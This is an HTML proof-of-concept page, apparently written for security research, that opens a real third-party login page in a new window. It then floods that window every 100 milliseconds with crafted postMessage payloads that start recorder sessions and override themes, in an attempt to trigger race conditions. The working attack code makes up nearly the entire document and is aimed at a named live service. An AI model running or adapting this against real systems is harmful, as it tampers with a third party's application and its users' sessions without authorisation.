<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PostMessage Cross-Origin Flood Test</title>
    <style>
        body { font-family: sans-serif; padding: 40px; text-align: center; }
        button { padding: 15px 30px; font-size: 16px; cursor: pointer; background: #e65100; color: white; border: none; border-radius: 5px; font-weight: bold; }
        button:hover { background: #b53d00; }
        #status { margin-top: 20px; color: #333; font-family: monospace; font-size: 14px; background: #ffe0b2; padding: 10px; display: inline-block; border-radius: 4px; }
    </style>
</head>
<body>

    <h2>Target Cross-Origin Message Flooding Test</h2>
    <p>This test broadcasts state-modification payloads every 0.1 seconds to test race conditions.</p>
    
    <button id="startFlood">Launch & Initiate Flood</button>
    <br><br>
    <div id="status">Status: Waiting for user action...</div>

    <script>
        document.getElementById('startFlood').addEventListener('click', () => {
            const targetUrl = "https://capitalcom.qualtrics.com/login";
            document.getElementById('status').innerText = "Status: Spawning target window...";

            // 1. Open the target application tab
            const victimWindow = window.open(targetUrl, "_blank");

            if (!victimWindow) {
                document.getElementById('status').innerText = "Status: Error - Popup blocker active.";
                return;
            }

            document.getElementById('status').innerText = "Status: Window opened. Waiting 6 seconds for initial SDK setup...";

            // 2. Initial buffer delay to let the targeted JS bundles finish compiling
            setTimeout(() => {
                document.getElementById('status').innerText = "Status: FLOOD ACTIVE. Transmitting payloads every 100ms...";

                // 3. Set up an interval loop to fire every 100 milliseconds (0.1s)
                let messageCount = 0;
                const floodInterval = setInterval(() => {
                    // Check if the window was closed by the user to stop the loop
                    if (victimWindow.closed) {
                        clearInterval(floodInterval);
                        document.getElementById('status').innerText = "Status: Target window closed. Flood stopped.";
                        return;
                    }

                    const payload = {
                        action: "startRecorderSession",
                        experience: {
                            id: "poc_flood_" + messageCount,
                            locale: "en-US",
                            theme: {
                                id: "flooded_theme_override",
                                name: "Flooded State Loop " + messageCount,
                                styles: {}
                            }
                        }
                    };

                    // 4. Fire the message across the boundary
                    victimWindow.postMessage(payload, "*");
                    
                    messageCount++;
                    document.getElementById('status').innerText = `Status: FLOOD ACTIVE. Messages sent: ${messageCount}`;
                }, 100); // 100ms = 0.1 seconds

            }, 6000); 
        });
    </script>

</body>
</html>
